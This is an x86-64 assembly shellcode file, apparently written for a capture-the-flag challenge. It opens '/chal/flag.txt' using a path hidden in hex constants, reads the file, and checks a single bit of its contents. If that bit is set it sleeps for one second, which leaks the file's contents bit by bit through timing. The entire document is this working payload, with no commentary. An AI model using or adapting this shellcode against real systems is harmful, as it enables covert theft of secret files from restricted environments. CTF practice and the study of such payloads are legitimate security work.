BITS 64
global _start

_start:
    xor    rdx, rdx
            xor    r10, r10
            mov    rdi, -100  
            mov    rax, 0x101             
            mov    rsi, 0x007478742e6761  
            push   rsi
            mov    rsi, 0x6c662f6c6168632f
            push   rsi
            push   rsp
            pop    rsi
            syscall
            mov    rdi, rax
            xor    rax, rax
            sub    rsp, 0x100
            lea    rsi, [rsp]
            mov    rdx, 0x100
            syscall
            mov    rdx, 4
            shl    rdx, 1
            add    rsi, rdx
            mov    rdi, [rsi]
            shr    rdi, 1
            and    rdi, 1
            jz     zero
            mov    rax, 0x23
            xor    rdi, rdi
            push   rdi
            inc    rdi
            push   rdi
            push   rsp
            pop    rdi
            syscall
        zero:
            mov    rax, 0x3c
            syscall